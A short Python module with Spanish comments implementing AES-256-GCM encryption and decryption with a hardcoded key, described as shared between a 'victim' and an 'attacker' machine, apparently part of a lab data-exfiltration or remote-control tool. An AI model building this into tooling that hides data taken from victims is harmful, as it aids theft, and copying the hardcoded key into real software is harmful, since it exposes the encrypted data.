# cifrado.py — compartido conceptualmente entre víctima y atacante
"""
Módulo de cifrado AES-256-GCM.

Se usa el mismo archivo en ambas máquinas (o se replica).
La clave debe ser idéntica en víctima y atacante.

Por qué AES-256-GCM sobre CBC:
  - GCM autentica el mensaje además de cifrarlo (AEAD)
  - Si un MITM altera el ciphertext, decrypt() lanza InvalidTag
  - CBC solo cifra, no detecta alteraciones

Implicancia de la clave hardcodeada:
  - Ventaja : simple, sin intercambio previo
  - Riesgo  : si el ejecutable se descompila, la clave queda expuesta
  - En producción real se usaría ECDH o RSA para intercambio dinámico
"""

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# Clave de 32 bytes = 256 bits. Hardcodeada para este entorno controlado.
# En bytes literales para evitar problemas de encoding.
KEY = bytes.fromhex(
    "6f3d2a1b8c4e5f7a9b0d1e2f3a4b5c6d"
    "7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b"
)  # 64 hex chars = 32 bytes = 256 bits


def encrypt(plaintext: bytes) -> bytes:
    """
    Cifra plaintext con AES-256-GCM.

    Genera un nonce aleatorio de 12 bytes por cada llamada.
    El nonce NO es secreto — se envía junto al ciphertext.
    Es necesario para que el receptor pueda descifrar.

    Formato de salida: nonce (12 bytes) + ciphertext+tag (N+16 bytes)

    Parámetros:
        plaintext (bytes): datos a cifrar (JSON del batch)

    Retorna:
        bytes: nonce + ciphertext + tag concatenados
    """
    aesgcm = AESGCM(KEY)
    nonce = AESGCM.generate_key(bit_length=96)[:12]  # 12 bytes = 96 bits
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)
    return nonce + ciphertext  # GCM incluye el tag al final del ciphertext


def decrypt(data: bytes) -> bytes:
    """
    Descifra datos cifrados con encrypt().

    Separa el nonce (primeros 12 bytes) del ciphertext+tag.
    Lanza cryptography.exceptions.InvalidTag si el mensaje
    fue alterado — útil para detectar un MITM activo.

    Parámetros:
        data (bytes): nonce + ciphertext + tag (salida de encrypt)

    Retorna:
        bytes: plaintext original
    """
    aesgcm = AESGCM(KEY)
    nonce = data[:12]
    ciphertext = data[12:]
    return aesgcm.decrypt(nonce, ciphertext, None)